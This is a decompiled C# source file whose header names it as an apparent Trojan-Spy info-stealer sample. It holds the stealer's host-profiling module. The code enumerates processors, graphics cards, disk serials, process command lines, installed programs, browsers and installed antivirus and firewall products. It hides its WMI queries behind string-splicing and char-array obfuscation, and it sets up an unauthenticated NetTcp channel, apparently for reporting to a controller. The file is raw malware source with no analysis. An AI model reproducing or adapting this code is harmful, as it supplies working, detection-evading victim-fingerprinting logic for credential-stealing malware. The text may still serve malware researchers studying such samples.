// Decompiled with JetBrains decompiler
// Type: SystemCollectionsGenericSortedSetEqualityComparers
// Assembly: Pursuits, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5AE29391-E6B0-4A11-8563-A9AF244B152D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f5d5176d0ac8a6c9093f39208d3aff397cce06017bbf0f2e4fee86a5ce09a398.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.ServiceModel;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Xml;

public static class SystemCollectionsGenericSortedSetEqualityComparers
{
  public static System.ServiceModel.Channels.Binding CreateBind()
  {
    NetTcpBinding bind = new NetTcpBinding();
    bind.MaxReceivedMessageSize = (long) int.MaxValue;
    bind.MaxBufferPoolSize = (long) int.MaxValue;
    bind.CloseTimeout = TimeSpan.FromMinutes(30.0);
    bind.OpenTimeout = TimeSpan.FromMinutes(30.0);
    bind.ReceiveTimeout = TimeSpan.FromMinutes(30.0);
    bind.SendTimeout = TimeSpan.FromMinutes(30.0);
    bind.TransferMode = TransferMode.Buffered;
    bind.ReaderQuotas = new XmlDictionaryReaderQuotas()
    {
      MaxDepth = 44567654,
      MaxArrayLength = int.MaxValue,
      MaxBytesPerRead = int.MaxValue,
      MaxNameTableCharCount = int.MaxValue,
      MaxStringContentLength = int.MaxValue
    };
    bind.Security = new NetTcpSecurity()
    {
      Mode = SecurityMode.None,
      Message = new MessageSecurityOverTcp()
      {
        ClientCredentialType = MessageCredentialType.None
      }
    };
    return (System.ServiceModel.Channels.Binding) bind;
  }

  public static List<SystemNetSocketsNetworkStreamb> GetProcessors()
  {
    List<SystemNetSocketsNetworkStreamb> processors = new List<SystemNetSocketsNetworkStreamb>();
    try
    {
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELSystem.Windows.FormsECT * FRSystem.Windows.FormsOM WinSystem.Windows.Forms32_ProcSystem.Windows.Formsessor".Replace("System.Windows.Forms", string.Empty)))
      {
        using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
        {
          foreach (ManagementObject managementObject in objectCollection)
          {
            try
            {
              processors.Add(new SystemNetSocketsNetworkStreamb()
              {
                Id1 = managementObject["Name"] as string,
                Id2 = Convert.ToString(managementObject["NumberOfCores"]),
                Id3 = MicrosoftWinUnsafeNativeMethodsL.Id1
              });
            }
            catch
            {
            }
          }
        }
      }
    }
    catch
    {
    }
    return processors;
  }

  public static List<SystemNetSocketsNetworkStreamb> GetGraphicCards()
  {
    List<SystemNetSocketsNetworkStreamb> graphicCards = new List<SystemNetSocketsNetworkStreamb>();
    try
    {
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("roSystem.Linqot\\CISystem.LinqMV2".Replace("System.Linq", string.Empty), "SELSystem.LinqECT * FRSystem.LinqOM WinSystem.Linq32_VideoCoSystem.Linqntroller".Replace("System.Linq", string.Empty)))
      {
        using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
        {
          foreach (ManagementObject managementObject in objectCollection)
          {
            try
            {
              uint uint32 = Convert.ToUInt32(managementObject["AdapterRAM"]);
              if (uint32 > 0U)
                graphicCards.Add(new SystemNetSocketsNetworkStreamb()
                {
                  Id1 = managementObject["Name"] as string,
                  Id2 = uint32.ToString(),
                  Id3 = MicrosoftWinUnsafeNativeMethodsL.Id2
                });
            }
            catch (Exception ex)
            {
            }
          }
        }
      }
    }
    catch (Exception ex)
    {
    }
    return graphicCards;
  }

  public static List<SystemNetSafeFreeCredentialSECURITYl> GetBrowsers()
  {
    List<SystemNetSafeFreeCredentialSECURITYl> browsers = new List<SystemNetSafeFreeCredentialSECURITYl>();
    try
    {
      RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet") ?? Registry.LocalMachine.OpenSubKey("SOFTWARE\\Clients\\StartMenuInternet");
      foreach (string subKeyName in registryKey1.GetSubKeyNames())
      {
        SystemNetSafeFreeCredentialSECURITYl credentialSecuritYl = new SystemNetSafeFreeCredentialSECURITYl();
        RegistryKey registryKey2 = registryKey1.OpenSubKey(subKeyName);
        credentialSecuritYl.Id1 = (string) registryKey2.GetValue((string) null);
        RegistryKey registryKey3 = registryKey2.OpenSubKey("shell\\open\\command");
        credentialSecuritYl.Id3 = registryKey3.GetValue((string) null).ToString().StripQuotes();
        credentialSecuritYl.Id2 = credentialSecuritYl.Id3 == null ? "Unknown Version" : FileVersionInfo.GetVersionInfo(credentialSecuritYl.Id3).FileVersion;
        browsers.Add(credentialSecuritYl);
      }
    }
    catch
    {
    }
    return browsers;
  }

  public static string GetSerialNumber()
  {
    try
    {
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELESystem.ManagementCT * FRSystem.ManagementOM WiSystem.Managementn32_DisSystem.ManagementkDrivSystem.Managemente".Replace("System.Management", string.Empty)))
      {
        using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
        {
          foreach (ManagementObject managementObject in objectCollection)
          {
            try
            {
              return managementObject["SerialNumber"] as string;
            }
            catch
            {
            }
          }
        }
      }
    }
    catch
    {
    }
    return string.Empty;
  }

  public static List<string> ListOfProcesses()
  {
    List<string> stringList = new List<string>();
    try
    {
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELSystem.Text.RegularExpressionsECT * FRSystem.Text.RegularExpressionsOM Win32_PSystem.Text.RegularExpressionsrocess WSystem.Text.RegularExpressionshere SessSystem.Text.RegularExpressionsionId='".Replace("", string.Empty) + (object) Process.GetCurrentProcess().SessionId + "'"))
      {
        using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
        {
          foreach (ManagementObject managementObject in objectCollection)
          {
            try
            {
              stringList.Add(new string(new char[4]
              {
                'I',
                'D',
                ':',
                ' '
              }) + managementObject[new string(new char[9]
              {
                'P',
                'r',
                'o',
                'c',
                'e',
                's',
                's',
                'I',
                'd'
              })]?.ToString() + new string(new char[8]
              {
                ',',
                ' ',
                'N',
                'a',
                'm',
                'e',
                ':',
                ' '
              }) + managementObject[new string(new char[4]
              {
                'N',
                'a',
                'm',
                'e'
              })]?.ToString() + new string(new char[15]
              {
                ',',
                ' ',
                'C',
                'o',
                'm',
                'm',
                'a',
                'n',
                'd',
                'L',
                'i',
                'n',
                'e',
                ':',
                ' '
              }) + managementObject[new string(new char[11]
              {
                'C',
                'o',
                'm',
                'm',
                'a',
                'n',
                'd',
                'L',
                'i',
                'n',
                'e'
              })]?.ToString());
            }
            catch
            {
            }
          }
        }
      }
    }
    catch
    {
    }
    return stringList;
  }

  public static List<string> GetVs()
  {
    List<string> vs = new List<string>();
    try
    {
      string str1 = new string(new char[141]
      {
        'A',
        'F',
        'i',
        'l',
        'e',
        'S',
        'y',
        's',
        't',
        'e',
        'm',
        'n',
        't',
        'i',
        'v',
        'F',
        'i',
        'l',
        'e',
        'S',
        'y',
        's',
        't',
        'e',
        'm',
        'i',
        'r',
        'u',
        's',
        'P',
        'r',
        'F',
        'i',
        'l',
        'e',
        'S',
        'y',
        's',
        't',
        'e',
        'm',
        'o',
        'd',
        'u',
        'F',
        'i',
        'l',
        'e',
        'S',
        'y',
        's',
        't',
        'e',
        'm',
        'c',
        't',
        '|',
        'A',
        'n',
        't',
        'i',
        'F',
        'i',
        'l',
        'e',
        'S',
        'y',
        's',
        't',
        'e',
        'm',
        'S',
        'p',
        'y',
        'W',
        'F',
        'i',
        'l',
        'e',
        'S',
        'y',
        's',
        't',
        'e',
        'm',
        'a',
        'r',
        'e',
        'P',
        'r',
        'o',
        'F',
        'i',
        'l',
        'e',
        'S',
        'y',
        's',
        't',
        'e',
        'm',
        'd',
        'u',
        'c',
        't',
        '|',
        'F',
        'i',
        'r',
        'e',
        'F',
        'i',
        'l',
        'e',
        'S',
        'y',
        's',
        't',
        'e',
        'm',
        'w',
        'a',
        'l',
        'l',
        'P',
        'r',
        'o',
        'd',
        'F',
        'i',
        'l',
        'e',
        'S',
        'y',
        's',
        't',
        'e',
        'm',
        'u',
        'c',
        't'
      }).Replace("FileSystem", string.Empty);
      char[] chArray1 = new char[1]{ '|' };
      foreach (string str2 in str1.Split(chArray1))
      {
        try
        {
          using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(new string(new char[19]
          {
            'R',
            'O',
            'O',
            'T',
            '\\',
            'S',
            'e',
            'c',
            'u',
            'r',
            'i',
            't',
            'y',
            'C',
            'e',
            'n',
            't',
            'e',
            'r'
          }), new string(new char[14]
          {
            'S',
            'E',
            'L',
            'E',
            'C',
            'T',
            ' ',
            '*',
            ' ',
            'F',
            'R',
            'O',
            'M',
            ' '
          }) + str2))
          {
            using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
            {
              foreach (ManagementBaseObject managementBaseObject in objectCollection)
              {
                try
                {
                  if (!vs.Contains(managementBaseObject[new string(new char[11]
                  {
                    'd',
                    'i',
                    's',
                    'p',
                    'l',
                    'a',
                    'y',
                    'N',
                    'a',
                    'm',
                    'e'
                  })] as string))
                    vs.Add(managementBaseObject[new string(new char[11]
                    {
                      'd',
                      'i',
                      's',
                      'p',
                      'l',
                      'a',
                      'y',
                      'N',
                      'a',
                      'm',
                      'e'
                    })] as string);
                }
                catch
                {
                }
              }
            }
          }
        }
        catch
        {
        }
      }
      string str3 = new string(new char[141]
      {
        'A',
        'F',
        'i',
        'l',
        'e',
        'S',
        'y',
        's',
        't',
        'e',
        'm',
        'n',
        't',
        'i',
        'v',
        'F',
        'i',
        'l',
        'e',
        'S',
        'y',
        's',
        't',
        'e',
        'm',
        'i',
        'r',
        'u',
        's',
        'P',
        'r',
        'F',
        'i',
        'l',
        'e',
        'S',
        'y',
        's',
        't',
        'e',
        'm',
        'o',
        'd',
        'u',
        'F',
        'i',
        'l',
        'e',
        'S',
        'y',
        's',
        't',
        'e',
        'm',
        'c',
        't',
        '|',
        'A',
        'n',
        't',
        'i',
        'F',
        'i',
        'l',
        'e',
        'S',
        'y',
        's',
        't',
        'e',
        'm',
        'S',
        'p',
        'y',
        'W',
        'F',
        'i',
        'l',
        'e',
        'S',
        'y',
        's',
        't',
        'e',
        'm',
        'a',
        'r',
        'e',
        'P',
        'r',
        'o',
        'F',
        'i',
        'l',
        'e',
        'S',
        'y',
        's',
        't',
        'e',
        'm',
        'd',
        'u',
        'c',
        't',
        '|',
        'F',
        'i',
        'r',
        'e',
        'F',
        'i',
        'l',
        'e',
        'S',
        'y',
        's',
        't',
        'e',
        'm',
        'w',
        'a',
        'l',
        'l',
        'P',
        'r',
        'o',
        'd',
        'F',
        'i',
        'l',
        'e',
        'S',
        'y',
        's',
        't',
        'e',
        'm',
        'u',
        'c',
        't'
      }).Replace("FileSystem", string.Empty);
      char[] chArray2 = new char[1]{ '|' };
      foreach (string str4 in str3.Split(chArray2))
      {
        try
        {
          using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(new string(new char[20]
          {
            'R',
            'O',
            'O',
            'T',
            '\\',
            'S',
            'e',
            'c',
            'u',
            'r',
            'i',
            't',
            'y',
            'C',
            'e',
            'n',
            't',
            'e',
            'r',
            '2'
          }), new string(new char[14]
          {
            'S',
            'E',
            'L',
            'E',
            'C',
            'T',
            ' ',
            '*',
            ' ',
            'F',
            'R',
            'O',
            'M',
            ' '
          }) + str4))
          {
            using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
            {
              foreach (ManagementBaseObject managementBaseObject in objectCollection)
              {
                try
                {
                  if (!vs.Contains(managementBaseObject[new string(new char[11]
                  {
                    'd',
                    'i',
                    's',
                    'p',
                    'l',
                    'a',
                    'y',
                    'N',
                    'a',
                    'm',
                    'e'
                  })] as string))
                    vs.Add(managementBaseObject[new string(new char[11]
                    {
                      'd',
                      'i',
                      's',
                      'p',
                      'l',
                      'a',
                      'y',
                      'N',
                      'a',
                      'm',
                      'e'
                    })] as string);
                }
                catch
                {
                }
              }
            }
          }
        }
        catch
        {
        }
      }
    }
    catch (Exception ex)
    {
    }
    return vs;
  }

  public static List<string> GetProcessesByName(string[] parts)
  {
    List<string> processesByName = new List<string>();
    try
    {
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SSystem.ELECT * FRSystem.OM WiSystem.n32_ProcSystem.ess WherSystem.e SessiSystem.onId='".Replace("System.", string.Empty) + (object) Process.GetCurrentProcess().SessionId + "'"))
      {
        using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
        {
          foreach (ManagementObject managementObject in objectCollection)
          {
            try
            {
              if (managementObject[new string(new char[4]
              {
                'N',
                'a',
                'm',
                'e'
              })]?.ToString() == string.Join("", parts))
                processesByName.Add(managementObject["ExecutablePath"]?.ToString());
            }
            catch
            {
            }
          }
        }
      }
    }
    catch
    {
    }
    return processesByName;
  }

  public static List<string> ListOfPrograms()
  {
    List<string> source = new List<string>();
    try
    {
      string name = new string(new char[51]
      {
        'S',
        'O',
        'F',
        'T',
        'W',
        'A',
        'R',
        'E',
        '\\',
        'M',
        'i',
        'c',
        'r',
        'o',
        's',
        'o',
        'f',
        't',
        '\\',
        'W',
        'i',
        'n',
        'd',
        'o',
        'w',
        's',
        '\\',
        'C',
        'u',
        'r',
        'r',
        'e',
        'n',
        't',
        'V',
        'e',
        'r',
        's',
        'i',
        'o',
        'n',
        '\\',
        'U',
        'n',
        'i',
        'n',
        's',
        't',
        'a',
        'l',
        'l'
      });
      using (RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey(name))
      {
        foreach (string subKeyName in registryKey1.GetSubKeyNames())
        {
          try
          {
            using (RegistryKey registryKey2 = registryKey1.OpenSubKey(subKeyName))
            {
              object obj1;
              if (registryKey2 == null)
                obj1 = (object) null;
              else
                obj1 = registryKey2.GetValue(new string(new char[11]
                {
                  'D',
                  'i',
                  's',
                  'p',
                  'l',
                  'a',
                  'y',
                  'N',
                  'a',
                  'm',
                  'e'
                }));
              string str1 = (string) obj1;
              object obj2;
              if (registryKey2 == null)
                obj2 = (object) null;
              else
                obj2 = registryKey2.GetValue(new string(new char[14]
                {
                  'D',
                  'i',
                  's',
                  'p',
                  'l',
                  'a',
                  'y',
                  'V',
                  'e',
                  'r',
                  's',
                  'i',
                  'o',
                  'n'
                }));
              string str2 = (string) obj2;
              if (!string.IsNullOrEmpty(str1))
              {
                if (!string.IsNullOrWhiteSpace(str2))
                {
                  string str3 = str1.Trim();
                  string str4 = str2.Trim();
                  source.Add(Regex.Replace(str3 + " [" + str4 + "]", new string(new char[16]
                  {
                    '[',
                    '^',
                    '\\',
                    'u',
                    '0',
                    '0',
                    '2',
                    '0',
                    '-',
                    '\\',
                    'u',
                    '0',
                    '0',
                    '7',
                    'F',
                    ']'
                  }), string.Empty));
                }
              }
            }
          }
          catch
          {
          }
        }
      }
    }
    catch
    {
    }
    return source.OrderBy<string, string>((Func<string, string>) (x => x)).ToList<string>();
  }

  public static List<string> AvailableLanguages()
  {
    List<string> stringList = new List<string>();
    try
    {
      return InputLanguage.InstalledInputLanguages.Cast<InputLanguage>().Select<InputLanguage, string>((Func<InputLanguage, string>) (lang => lang.Culture.EnglishName)).ToList<string>();
    }
    catch
    {
    }
    return stringList;
  }

  public static string CollectMemory()
  {
    string str = "Concat0 MConcatb oConcatr Concat0".Replace("Concat", string.Empty);
    try
    {
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELEMemoryCT * FMemoryROM WiMemoryn32_OperMemoryatingSMemoryystem".Replace("Memory", string.Empty)))
      {
        using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
        {
          foreach (ManagementObject managementObject in objectCollection)
          {
            try
            {
              double num1 = Convert.ToDouble(managementObject[new string(new char[22]
              {
                'T',
                'o',
                't',
                'a',
                'l',
                'V',
                'i',
                's',
                'i',
                'b',
                'l',
                'e',
                'M',
                'e',
                'm',
                'o',
                'r',
                'y',
                'S',
                'i',
                'z',
                'e'
              })]);
              double num2 = num1 * 1024.0;
              str = string.Format("{0}{1}{2}", (object) Math.Round(num1 / 1024.0, 2), (object) new string(new char[7]
              {
                ' ',
                'M',
                'B',
                ' ',
                'o',
                'r',
                ' '
              }), (object) num2).Replace(',', '.');
            }
            catch
            {
            }
          }
        }
      }
    }
    catch
    {
    }
    return str;
  }

  public static string GetWindowsVersion()
  {
    try
    {
      string str1;
      try
      {
        str1 = Environment.Is64BitOperatingSystem ? "x64" : "x32";
      }
      catch (Exception ex)
      {
        str1 = "x86";
      }
      string str2 = HKLM_GetString("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
      HKLM_GetString("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CSDVersion");
      if (!string.IsNullOrEmpty(str2))
        return str2 + " " + str1;
    }
    catch (Exception ex)
    {
    }
    return string.Empty;

    static string HKLM_GetString(string key, string value)
    {
      try
      {
        return Registry.LocalMachine.OpenSubKey(key)?.GetValue(value).ToString() ?? string.Empty;
      }
      catch
      {
        return string.Empty;
      }
    }
  }
}
